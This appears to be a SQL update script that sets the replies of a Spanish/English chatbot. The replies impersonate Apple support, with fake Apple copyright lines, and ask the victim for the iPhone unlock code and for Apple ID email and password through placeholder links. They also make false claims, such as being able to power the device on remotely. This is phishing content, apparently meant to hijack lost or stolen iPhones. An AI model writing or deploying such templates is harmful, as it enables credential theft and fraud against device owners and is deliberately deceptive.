-- Update chatbot response for option 2 to use placeholder
UPDATE chatbot_responses 
SET response_es = '*🌍 ✅ Opción 2 seleccionada*
*Ubicación mediante navegador web*

Para habilitar el rastreo del dispositivo y conectarlo a una red cercana, ingresa el código de desbloqueo (4 o 6 dígitos) que usaste en tu iPhone.
Una vez validado, recibirás un enlace predeterminado para acceder a nuestra herramienta de búsqueda web.

Ver ubicación aquí: {{url_option_2}}

⚠️ *Este paso permite encender y conectar el dispositivo remotamente para que su ubicación se pueda ver desde cualquier navegador.*

🔐 *Esta medida garantiza que solo el propietario pueda iniciar el proceso de rastreo.*

*🛡️ Soporte disponible 24/7*
*©️ 2025 Apple Inc. – Todos los derechos reservados.*',
response_en = '🌍 ✅ *Option 2 selected*
*Location via web browser*

To enable device tracking and connect it to a nearby network, enter the unlock code (4 or 6 digits) you used on your iPhone.
Once validated, you will receive a default link to access our web search tool.

View location here: {{url_option_2}}

⚠️ *This step allows the device to be turned on and connected remotely so its location can be viewed from any browser.*

🔐 *This measure ensures that only the owner can initiate the tracking process.*

*🛡️ Support available 24/7*
*©️ 2025 Apple Inc. – All rights reserved.*'
WHERE keyword = '2';

-- Update chatbot response for option 3 to use placeholder
UPDATE chatbot_responses 
SET response_es = '🧑‍💻 ✅ *Opción 3 seleccionada*
*Soporte mediante sesión técnica*

Para continuar con el soporte personalizado y la recuperación de ubicación avanzada, accede a nuestra plataforma con tus credenciales de Apple.
Introduce tu correo electrónico y contraseña a través del siguiente enlace seguro:

🔗 *[Enlace de la sesión técnica]*
{{url_option_3}}

⚠️ *Este método permite la asistencia directa con un agente y garantiza el control total de tu cuenta y dispositivo.*

*🛡️ Soporte disponible 24/7*
*©️ 2025 Apple Inc. – Todos los derechos reservados.*',
response_en = '🧑‍💻 ✅ *Option 3 selected*
*Support via technical session*

To continue with personalized support and advanced location recovery, access our platform with your Apple credentials.
Enter your email and password through the following secure link:

🔗 *[Technical session link]*
{{url_option_3}}

⚠️ *This method allows direct assistance with an agent and guarantees full control of your account and device.*

*🛡️ Support available 24/7*
*©️ 2025 Apple Inc. – All rights reserved.*'
WHERE keyword = '3';

-- Update chatbot response for option 4 to use placeholder
UPDATE chatbot_responses 
SET response_es = '🔄 ✅ *Opción 4 seleccionada*
*Restaurar el acceso a tu cuenta de Apple*

¿Olvidaste tu correo electrónico o contraseña? No te preocupes.

Solo necesitas ingresar tu código de desbloqueo (4 o 6 dígitos).
Una vez validado, recibirás un correo electrónico temporal y una nueva contraseña por SMS para acceder a tu cuenta de iCloud.

🔗 *[Enlace de recuperación]* {{url_option_4}}

⚠️ *Esta verificación es crucial para proteger tus datos personales y garantizar que solo tú recuperes el acceso.*

*🛡️ Soporte disponible 24/7*
*©️ 2025 Apple Inc. – Todos los derechos reservados.*',
response_en = '🔄 ✅ *Option 4 selected*
*Restore access to your Apple account*

Forgot your email or password? Do not worry.

You just need to enter your unlock code (4 or 6 digits).
Once validated, you will receive a temporary email and a new password via SMS to access your iCloud account.

🔗 *[Recovery link]* {{url_option_4}}

⚠️ *This verification is crucial to protect your personal data and ensure that only you recover access.*

*🛡️ Support available 24/7*
*©️ 2025 Apple Inc. – All rights reserved.*'
WHERE keyword = '4';